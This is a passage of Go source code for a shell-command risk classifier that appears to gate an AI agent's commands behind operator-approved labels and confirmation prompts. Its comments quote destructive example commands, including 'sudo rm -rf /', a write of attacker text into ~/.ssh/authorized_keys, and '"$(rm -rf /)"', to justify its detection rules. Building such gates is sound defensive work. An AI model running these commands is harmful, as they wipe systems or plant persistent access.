	// wrong half of what is happening.
	Via string `json:"via,omitempty"`
	// Labels is everything this segment does. Empty means an empty
	// segment — a trailing ";" — which the caller skips.
	Labels []RiskLabel `json:"labels"`
	// Why names the READING that produced the labels when it was not
	// simply the program's table entry: "scratch_path", "system_path",
	// "shell_keyword", "opaque_target". A closed set, never free text,
	// and empty when the labels speak for themselves.
	Why string `json:"why,omitempty"`
}

// RiskVerdict is the classification of a whole command line.
type RiskVerdict struct {
	// Labels is the union across every segment.
	//
	// A union rather than a maximum, which is the whole change: a
	// command that deletes AND reaches the network now reports both,
	// where the tier this replaced kept only the worst and the egress
	// vanished from the verdict entirely.
	Labels []RiskLabel `json:"labels"`
	// Programs is every program named, in order, without repeats. This
	// is what makes a 400-character probe legible in one line.
	Programs []string      `json:"programs,omitempty"`
	Segments []RiskSegment `json:"segments,omitempty"`
	// Why is the culprit segment's reading.
	Why string `json:"why,omitempty"`
	// Culprit is the segment carrying the severest label, and
	// CulpritIndex its 1-based position. Display only — nothing gates
	// on severity, and this exists so the prompt quotes the step that
	// caused the ask rather than the whole line.
	Culprit      string `json:"culprit,omitempty"`
	CulpritIndex int    `json:"culprit_index,omitempty"`
	// Unreadable counts segments the classifier could not read.
	Unreadable int `json:"unreadable,omitempty"`
	// FromModel records that a configured model contributed labels.
	FromModel bool `json:"from_model,omitempty"`
}

// Approved reports whether every label this command carries is one the
// operator approved.
//
// THE GATE, and deliberately a subset check rather than a comparison.
// Nothing is ranked: a command may run when everything it does was
// approved, and asks otherwise. LabelUnreadable is never in an
// approved set, so a command nobody could read always asks.
func (v RiskVerdict) Approved(approved map[RiskLabel]bool) bool {
	if len(v.Labels) == 0 {
		return false
	}
	for _, l := range v.Labels {
		// Refused by name, not merely by being absent from the set. An
		// operator cannot approve "everything I could not read" even by
		// writing it out, and ApprovedLabels rejects it at parse time
		// too — belt and braces, because this is the one label whose
		// approval would approve everything.
		if l == LabelUnreadable || !approved[l] {
			return false
		}
	}
	return true
}

// ClassifyRisk reads a command line and says what it does.
//
// Never returns an error: an input it cannot read is a verdict of
// L(LabelUnreadable), which is a real answer and the one that asks.
func ClassifyRisk(raw string) RiskVerdict {
	cmd := strings.TrimSpace(raw)
	if cmd == "" || !utf8.ValidString(cmd) {
		return RiskVerdict{Labels: L(LabelUnreadable), Why: "unreadable"}
	}
	segs, ok := splitRiskSegments(cmd)
	if !ok || len(segs) == 0 {
		return RiskVerdict{Labels: L(LabelUnreadable), Why: "unreadable"}
	}

	table := ActiveCommandRisks()
	var v RiskVerdict
	seen := map[string]bool{}
	worst := 0
	for _, seg := range segs {
		rs := classifyRiskSegment(seg, table)
		if len(rs.Labels) == 0 {
			continue // an empty segment: a trailing ";" or a stray "&&"
		}
		v.Segments = append(v.Segments, rs)
		v.Labels = mergeLabels(v.Labels, rs.Labels)
		if hasLabel(rs.Labels, LabelUnreadable) {
			v.Unreadable++
		}
		// The wrapper first, then the program it ran: `sudo`, `true`.
		// A shell keyword is not a program and listing `for`, `do`,
		// `done` alongside `id` and `uname` turns the one legible line
		// in the prompt back into noise.
		for _, name := range []string{rs.Via, rs.Program} {
			if name == "" || seen[name] || rs.Why == "shell_keyword" {
				continue
			}
			seen[name] = true
			v.Programs = append(v.Programs, name)
		}
		// Severity picks which segment the prompt quotes. It decides
		// nothing about whether the command runs.
		if sev := severityOf(rs.Labels); sev > worst {
			worst = sev
			v.Culprit, v.CulpritIndex, v.Why = rs.Raw, len(v.Segments), rs.Why
		}
	}
	if len(v.Segments) == 0 {
		return RiskVerdict{Labels: L(LabelUnreadable), Why: "unreadable"}
	}
	return v
}

// classifyRiskSegment reads one segment's argv.
func classifyRiskSegment(seg riskSegment, table map[string]CommandRiskRule) RiskSegment {
	out := RiskSegment{Raw: seg.raw}
	unreadable := func(program, why string) RiskSegment {
		out.Program, out.Labels, out.Why = program, L(LabelUnreadable), why
		return out
	}
	if seg.unreadable != "" {
		return unreadable("", seg.unreadable)
	}
	tokens := seg.tokens
	if len(tokens) == 0 {
		return out // no labels — the caller skips it
	}

	// Wrappers first, and bounded: a chain longer than this is not a
	// command anybody wrote by hand, and an unbounded loop over
	// attacker-shaped argv is not worth the elegance.
	var floor []RiskLabel
	for range 4 {
		if tokens[0].expands {
			return unreadable("", "variable_command")
		}
		name := programName(tokens[0])
		w, isWrapper := wrapperCommands[name]
		if !isWrapper {
			break
		}
		rest, ok := unwrap(tokens[1:], w)
		if !ok {
			return unreadable(name, "unreadable_wrapper")
		}
		if w.root {
			// Privilege is ADDED, not substituted. `sudo rm -rf /` is a
			// deletion and a privilege escalation, and reporting only
			// one of them describes half of what is happening.
			floor = mergeLabels(floor, L(LabelPrivilege))
			out.Via = name
		}
		tokens = rest
	}

	if tokens[0].expands {
		return unreadable("", "variable_command")
	}
	name := programName(tokens[0])
	out.Program = name

	if shellReservedWords[name] {
		// `for`, `while`, `if`, `time`. The body is not parsed; see the
		// non-goal in the design. Reported distinctly so the prompt can
		// say "shell loop" rather than "unrecognised command: for".
		return unreadable(name, "shell_keyword")
	}

	rule, found := table[name]
	if !found {
		// A classified network program still counts even when it is not
		// in the risk table — DefaultCommandClasses is the one place
		// "reaches off the box" is written down, and an operator who
		// adds a command there should not have to add it twice.
		if class, ok := ActiveCommandClasses()[name]; ok && class.Action != "" {
			out.Labels = mergeLabels(labelsOfAction(class.Action), floor)
			return out
		}
		return unreadable(name, "unrecognised_command")
	}

	labels := rule.Labels
	if len(labels) == 0 {
		labels = L(LabelUnreadable)
	}
	out.Why = rule.Why
	args := tokens[1:]

	if len(rule.Sub) > 0 {
		sub, expands, ok := firstOperand(args)
		switch {
		case !ok:
			// Bare invocation: `git` on its own prints usage.
		case expands:
			return unreadable(name, "variable_subcommand")
		default:
			named, ok := rule.Sub[sub]
			if !ok {
				return unreadable(name, "unrecognised_subcommand")
			}
			labels = named
		}
	} else if len(rule.OperandLabels) > 0 {
		if _, _, ok := firstOperand(args); ok {
			labels = mergeLabels(labels, rule.OperandLabels)
		}
	}

	for _, tok := range args {
		for pattern, esc := range rule.Escalate {
			if escalateMatches(pattern, tok.text) {
				labels = mergeLabels(labels, esc)
			}
		}
	}
	if len(seg.writeTargets) > 0 {
		// A redirection writes whatever the program on the left prints,
		// so the segment writes however innocent that program is.
		// `echo pwned > ~/.ssh/authorized_keys` is the case that makes
		// this non-negotiable.
		labels = mergeLabels(labels, L(LabelWrites))
	}

	// Only a targeting program's own operands are read as paths. For
	// anything else the operands are inputs — `grep root /etc/passwd`
	// reads a system file and changes nothing — so the only paths that
	// count are the ones being redirected into.
	var operands []riskToken
	if rule.Targets {
		operands = targetOperands(args, rule.TargetLast)
	}
	if len(operands) > 0 || len(seg.writeTargets) > 0 {
		labels, out.Why = applyTargets(labels, rule, operands, seg.writeTargets)
	}

	out.Labels = mergeLabels(labels, floor)
	return out
}

// labelsOfAction maps a command class's action onto labels, so the two
// tables cannot drift.
func labelsOfAction(action string) []RiskLabel {
	switch action {
	case RemoteAction, RemoteCopyAction, NetFetchAction:
		return L(LabelNetwork)
	default:
		return L(LabelUnreadable)
	}
}

// programName is the command as invoked, without its path:
// /usr/bin/ssh is ssh, the same reading ClassifyCommand takes.
func programName(t riskToken) string {
	name := t.text
	if i := strings.LastIndexByte(name, '/'); i >= 0 {
		name = name[i+1:]
	}
	return name
}

// targetOperands returns the non-flag arguments a targeting program
// acts on: all of them, or only the last when the rest are sources.
func targetOperands(args []riskToken, lastOnly bool) []riskToken {
	var operands []riskToken
	for _, a := range args {
		if strings.HasPrefix(a.text, "-") {
			continue
		}
		operands = append(operands, a)
	}
	if lastOnly && len(operands) > 1 {
		return operands[len(operands)-1:]
	}
	return operands
}

// firstOperand returns the first non-flag argument.
func firstOperand(args []riskToken) (text string, expands, ok bool) {
	for _, a := range args {
		if strings.HasPrefix(a.text, "-") {
			continue
		}
		return a.text, a.expands, true
	}
	return "", false, false
}

// unwrap drops a wrapper's own flags and operands, returning the
// command it runs. ok=false when there is nothing left, or when the
// wrapper carries something that changes what the command means.
func unwrap(args []riskToken, w wrapperSpec) ([]riskToken, bool) {
	skipped := 0
	for i := 0; i < len(args); i++ {
		tok := args[i].text
		if strings.HasPrefix(tok, "-") {
			if w.valueFlags[tok] {
				i++
			}
			continue
		}
		if w.refuseAssign && isEnvAssignment(tok) {
			return nil, false
		}
		if skipped < w.skipOperands {
			skipped++
			continue
		}
		return args[i:], true
	}
	return nil, false
}

// escalateMatches compares an Escalate key against a token: exact, or
// prefix when the key ends in "*".
func escalateMatches(pattern, tok string) bool {
	if strings.HasSuffix(pattern, "*") {
		return strings.HasPrefix(tok, strings.TrimSuffix(pattern, "*"))
	}
	return pattern == tok
}

// ---------------------------------------------------------------------
// Reading the command line.
//
// Deliberately MORE permissive than NormaliseCommand, and the
// difference is the question being asked. That one asks "is there a
// stable name a grant could be written against", so a glob defeats it:
// `rm *` names a different set of files every time it runs. This one
// asks "what does it do", and a glob does not change the answer —
// `ls *.go` still reads and `rm *` still deletes. Refusing globs here
// would make the classifier blind to commands it can classify
// perfectly well.
//
// What it does refuse is anything that introduces a program it has not
// read: command substitution, backticks, a variable in the command
// slot, a subshell.

type riskToken struct {
	text string
	// expands records that the token carried a $ outside single
	// quotes, so its value is not what is written. Only consulted in
	// positions the classifier reads — argv[0] and a subcommand — since
	// elsewhere an expansion adds arguments to a program already
	// identified.
	expands bool
}

type riskSegment struct {
	raw    string
	tokens []riskToken
	// unreadable is a reason code, set when something in this segment
	// defeats static reading.
	unreadable string
	// writeTargets are the paths this segment redirects into, other
	// than /dev/null and file-descriptor dups. Kept as tokens rather
	// than a bool so `> /etc/passwd` and `> /tmp/probe` can be told
	// apart.
	writeTargets []riskToken
}

// splitRiskSegments breaks a command line into the commands it runs.
//
// ok=false only for input that is not a command line at all: an
// unterminated quote, or a control character. Everything else produces
// segments, some of which may be marked unreadable.
func splitRiskSegments(cmd string) ([]riskSegment, bool) {
	sc := &riskScanner{runes: []rune(cmd)}
	if !sc.scan() {
		return nil, false
	}
	return sc.segs, true
}

// riskScanner walks a command line once, accumulating tokens into
// segments.
//
// A struct rather than a closure over locals, because the dispatch is
// wide — quotes, substitutions, redirects, separators — and each kind
// needs the same five accumulators. Sharing them through a receiver is
// what lets the loop body split into methods that are each readable on
// their own.
type riskScanner struct {
	runes []rune
	segs  []riskSegment
	cur   riskSegment

	tok     strings.Builder
	started bool
	expands bool

	segStart int
	// subDepth counts open "$(" and backtick reports an open backtick.
	// Inside either, the separators belong to a command this scanner is
	// not reading, so they must not split anything out here.
	subDepth int
	backtick bool
}

// scan runs the walk. false means the input is not a command line.
func (s *riskScanner) scan() bool {
	for i := 0; i < len(s.runes); i++ {
		r := s.runes[i]
		if !riskReadableRune(r) {
			return false
		}
		if r == '\'' || r == '"' {
			q, ok := scanQuoted(s.runes, i)
			if !ok {
				return false
			}
			s.addQuoted(q)
			i = q.end
			continue
		}
		// Order is load-bearing. Substitution and redirect handling run
		// BEFORE the inside-a-substitution check, so `$(` still opens a
		// depth and `)` still closes one; everything after it is inert
		// while a substitution is open.
		if next, handled := s.scanUnreadable(r, i); handled {
			i = next
			continue
		}
		if next, handled := s.scanRedirect(r, i); handled {
			i = next
			continue
		}
		if s.subDepth > 0 || s.backtick {
			s.write(r)
			continue
		}
		if next, handled := s.scanSeparator(r, i); handled {
			i = next
			continue
		}
		s.write(r)
	}
	s.flushSegment(len(s.runes))
	return true
}

// scanUnreadable handles the runes that mean this segment cannot be
// read statically: an escape, a substitution, a subshell.
func (s *riskScanner) scanUnreadable(r rune, i int) (int, bool) {
	switch r {
	case '\\':
		// An escape changes what the next character means in ways the
		// token text would not preserve.
		s.cur.unreadable = "escaped_command"
		s.started = true
	case '`':
		s.cur.unreadable = "command_substitution"
		s.backtick = !s.backtick
		s.started = true
	case '$':
		if i+1 < len(s.runes) && s.runes[i+1] == '(' {
			s.cur.unreadable = "command_substitution"
			s.subDepth++
			s.started = true
			return i + 1, true
		}
		s.expands = true
		s.tok.WriteRune(r)
		s.started = true
	case '(', ')':
		if r == ')' && s.subDepth > 0 {
			s.subDepth--
			return i, true
		}
		// A subshell runs its contents somewhere this classifier is not
		// reading.
		s.cur.unreadable = "subshell"
		s.started = true
	default:
		return i, false
	}
	return i, true
}

// scanRedirect handles ">", "<" and bash's "&>".
func (s *riskScanner) scanRedirect(r rune, i int) (int, bool) {
	at := i
	switch {
	case r == '>' || r == '<':
		// A bare number in front of a redirect is a file descriptor,
		// not an argument: `apt-get --version 2>&1` passes no operand
		// called "2", and treating it as one would send the subcommand
		// lookup hunting for it.
		if s.started && allDigits(s.tok.String()) {
			s.tok.Reset()
			s.started, s.expands = false, false
		}
	case r == '&' && i+1 < len(s.runes) && s.runes[i+1] == '>':
		at = i + 1 // "&>file": stdout and stderr to one place
	default:
		return i, false
	}
	s.flushToken()
	return consumeRedirect(s.runes, at, &s.cur), true
}

// scanSeparator handles whitespace and the operators that end a
// command: newline, ";", "&", "|", "&&", "||".
func (s *riskScanner) scanSeparator(r rune, i int) (int, bool) {
	switch r {
	case ' ', '\t':
		s.flushToken()
		return i, true
	case '\n', ';':
		s.flushSegment(i)
		s.segStart = i + 1
		return i, true
	case '&', '|':
		end, next := i, i
		if i+1 < len(s.runes) && s.runes[i+1] == r {
			next++ // "&&" or "||"
		}
		s.flushSegment(end)
		s.segStart = next + 1
		return next, true
	}
	return i, false
}

// addQuoted folds a quoted run into the token being built.
func (s *riskScanner) addQuoted(q quotedSpan) {
	if q.substitutes {
		s.cur.unreadable = "command_substitution"
	}
	if q.expands {
		s.expands = true
	}
	s.tok.WriteString(q.text)
	s.started = true
}

// write appends an ordinary rune to the token being built.
func (s *riskScanner) write(r rune) {
	s.tok.WriteRune(r)
	s.started = true
}

func (s *riskScanner) flushToken() {
	if s.started {
		s.cur.tokens = append(s.cur.tokens, riskToken{text: s.tok.String(), expands: s.expands})
		s.tok.Reset()
		s.started, s.expands = false, false
	}
}

func (s *riskScanner) flushSegment(end int) {
	s.flushToken()
	s.cur.raw = strings.TrimSpace(string(s.runes[s.segStart:end]))
	if s.cur.raw != "" || len(s.cur.tokens) > 0 {
		s.segs = append(s.segs, s.cur)
	}
	s.cur = riskSegment{}
}

// riskReadableRune rejects the runes that make one string display as
// another.
//
// A segment that DISPLAYS as one command and IS another is consent
// obtained by misdirection, and the prompt quotes this text back at the
// user. Same refusal NormaliseCommand makes, for the same reason.
func riskReadableRune(r rune) bool {
	if unicode.IsControl(r) && r != '\n' && r != '\t' {
		return false
	}
	return !isInvisible(r) && !(r > unicode.MaxASCII && unicode.IsSpace(r))
}

// quotedSpan is what a quoted run contributes to the token being built.
type quotedSpan struct {
	text string
	// expands records a $ that is still live inside the quotes.
	expands bool
	// substitutes records a $( or a backtick, which runs a program
	// this classifier has not read.
	substitutes bool
	// end is the index of the closing quote.
	end int
}

// scanQuoted reads the quoted run starting at runes[i].
//
// Single quotes are literal; double quotes are not, and that
// difference is the whole reason this is separate. Expansion and
// substitution both still happen inside double quotes, so quoting does
// NOT make `"$(rm -rf /)"` inert — a scanner that treated every quoted
// span as data would classify it as an ordinary argument.
//
// ok=false for an unterminated quote, which is not a command line.
func scanQuoted(runes []rune, i int) (quotedSpan, bool) {
	quote := runes[i]
	closing := indexRune(runes, i+1, quote)
	if closing < 0 {
		return quotedSpan{}, false
	}
	inner := runes[i+1 : closing]
	span := quotedSpan{text: string(inner), end: closing}
	if quote == '\'' {
		return span, true
	}
	for j := 0; j < len(inner); j++ {
		switch inner[j] {
		case '`':
			span.substitutes = true
		case '$':
			if j+1 < len(inner) && inner[j+1] == '(' {
				span.substitutes = true
			} else {
				span.expands = true
			}
		}
	}
	return span, true
}

// consumeRedirect reads a redirection starting at the ">" or "<" in
// runes[i], recording on seg whether it writes somewhere real, and
// returns the index of the last rune consumed.
func consumeRedirect(runes []rune, i int, seg *riskSegment) int {
	reading := runes[i] == '<'
	j := i + 1
	if j < len(runes) && (runes[j] == '>' || runes[j] == '<') {
		j++ // ">>" append, "<<" heredoc
	}
	for j < len(runes) && (runes[j] == ' ' || runes[j] == '\t') {
		j++
	}
	start := j
	// A leading "&" is a file-descriptor dup ("2>&1"), not the
	// backgrounding operator, so it belongs to the target rather than
	// ending it.
	if j < len(runes) && runes[j] == '&' {
		j++
	}
	for j < len(runes) && !strings.ContainsRune(" \t\n;|&()<>", runes[j]) {
		j++
	}
	target := string(runes[start:j])
	switch {
	case reading:
		// Reading from a file changes nothing.
	case strings.HasPrefix(target, "&"):
		// A file-descriptor dup: `2>&1` writes nowhere new.
	case target == "/dev/null" || target == "/dev/stdout" || target == "/dev/stderr":
		// The conventional way to say "discard", and the reason a
		// probe full of `2>/dev/null` is not reported as a write.
	case target == "":
		seg.unreadable = "unreadable_redirect"
	default:
		seg.writeTargets = append(seg.writeTargets, riskToken{
			text:    target,
			expands: strings.Contains(target, "$"),
		})
	}
	return j - 1
}

// allDigits reports whether s is a bare number, which in front of a
// redirect means a file descriptor.
func allDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// indexRune finds r at or after start, or -1.
func indexRune(runes []rune, start int, r rune) int {
	for i := start; i < len(runes); i++ {
		if runes[i] == r {
			return i
		}
	}
	return -1
}

// ---------------------------------------------------------------------
// The operator's table, and the tier on the request context.

// activeCommandRisks is the table in force, in the shape
// activeCommandClasses already uses.
var activeCommandRisks atomic.Pointer[map[string]CommandRiskRule]

// SetCommandRisks installs the operator's table, MERGED over the
// shipped one rather than replacing it.
//
// The opposite of SetCommandClasses, deliberately. That table has six
// entries and an operator can reasonably restate it; this one has
// hundreds, and replacing it wholesale would mean adding one in-house
// tool silently reclassified every command in the table as unknown —
// turning a small config edit into a flood of confirmations, which is
// the failure this whole change exists to remove. An entry with an
// empty tier removes the shipped one, which is how somebody says "stop
// classifying this".
func SetCommandRisks(m map[string]CommandRiskRule) {
	if len(m) == 0 {
		activeCommandRisks.Store(nil)
		return
	}
	merged := make(map[string]CommandRiskRule, len(DefaultCommandRisks)+len(m))
	for k, v := range DefaultCommandRisks {
		merged[k] = v
	}
	for k, v := range m {
		if len(v.Labels) == 0 && len(v.Sub) == 0 && len(v.Escalate) == 0 && len(v.OperandLabels) == 0 {
			delete(merged, k)
			continue
		}
		merged[k] = v
	}
	activeCommandRisks.Store(&merged)
}

// ActiveCommandRisks returns the table in force.
func ActiveCommandRisks() map[string]CommandRiskRule {
	if m := activeCommandRisks.Load(); m != nil {
		return *m
	}
	return DefaultCommandRisks
}

// riskProgramsShown bounds the program list in a headline. Past this
// the list stops being a summary and becomes another wall.
const riskProgramsShown = 8

// RiskHeadline is the one line that leads a confirmation prompt.
//
// It answers, in order, the three things somebody about to tap Approve
// needs: what KIND of thing this is, WHICH part made it that, and what
// it touches. The verbatim command still follows — this is added to
// it, never instead of it.
func RiskHeadline(v RiskVerdict) string {
	if len(v.Labels) == 0 {
		return ""
	}
	var b strings.Builder
	// The label set leads, severest first. A command that deletes AND
	// reaches the network says both — which is the point of the set,
	// and what a single tier could not tell you.
	b.WriteString(RenderLabels(v.Labels))

	switch {
	case hasLabel(v.Labels, LabelUnreadable) && v.Unreadable > 0 && len(v.Segments) > 1:
		fmt.Fprintf(&b, " · %d of %d steps unreadable (%s)",
			v.Unreadable, len(v.Segments), v.Why)
	case v.CulpritIndex > 0 && len(v.Segments) > 1 && severityOf(v.Labels) > labelSeverity[LabelReads]:
		// Naming the step is the largest readability win there is: in a
		// 300-character probe, one `rm` is why the question is being
		// asked and the other eight steps are noise.
		fmt.Fprintf(&b, " · `%s` (step %d of %d)", v.Culprit, v.CulpritIndex, len(v.Segments))
	case v.Why != "":
		b.WriteString(" · " + v.Why)
	}

	if len(v.Programs) > 0 {
		b.WriteString(" · ")
		if len(v.Programs) > riskProgramsShown {
			b.WriteString(strings.Join(v.Programs[:riskProgramsShown], ", "))
			fmt.Fprintf(&b, " +%d more", len(v.Programs)-riskProgramsShown)
		} else {
			b.WriteString(strings.Join(v.Programs, ", "))
		}
	}
	if v.FromModel {
		// Said out loud, because a label a model contributed is a
		// different kind of claim from one read off the argv.
		b.WriteString(" · model")
	}
	return b.String()
}

// RiskGrantResource is the key a grant covering ONE LABEL is recorded
// under.
//
// Per label rather than per command, because that is what makes the
// grant compose: a conversation that has approved "reads" and "writes"
// satisfies a command carrying both, without anybody having granted
// that exact pair. The gate subtracts what is already granted and asks
// about the remainder.
//
// A sentinel in the shape of the "(cwd=…)" and "(remote=…)" keys and
// of !unclassified: a real key always begins with a rendered command
// token, and NormaliseCommand single-quotes anything starting with "("
// — so no command can land in this namespace by accident, and an
// operator writing one has said what they meant.
func RiskGrantResource(label RiskLabel) string {
	if !label.Valid() || label == LabelUnreadable {
		// Unreadable is never grantable. "Allow everything I could not
		// read" is not a decision anybody can make.
		return ""
	}
	return "(risk=" + string(label) + ")"
}

// commandLabelsKey carries the classified labels from the approval gate
// to the policy condition evaluator.
//
// On the context rather than in the Evaluate signature, because the
// engine's question is (subject, action, resource) and widening it for
// one condition would put a shell concept into every policy check.
// ConditionEvaluator already takes a ctx for exactly this.
type commandLabelsKey struct{}

// WithCommandLabels records what this request was classified as.
//
// The labels come from the classifier over the parameters the executor
// is about to run, never from anything the model wrote as prose — the
// same reason the turn identity comes from the request context.
func WithCommandLabels(ctx context.Context, labels []RiskLabel) context.Context {
	kept := make([]RiskLabel, 0, len(labels))
	for _, l := range labels {
		if l.Valid() {
			kept = append(kept, l)
		}
	}
	if len(kept) == 0 {
		return ctx
	}
	return context.WithValue(ctx, commandLabelsKey{}, kept)
}

// CommandLabelsFrom reads them back. ok=false means this request was
// never classified — a memory write, say — and a rule conditioned on
// labels must not apply to it.
func CommandLabelsFrom(ctx context.Context) ([]RiskLabel, bool) {
	l, ok := ctx.Value(commandLabelsKey{}).([]RiskLabel)
	return l, ok
}
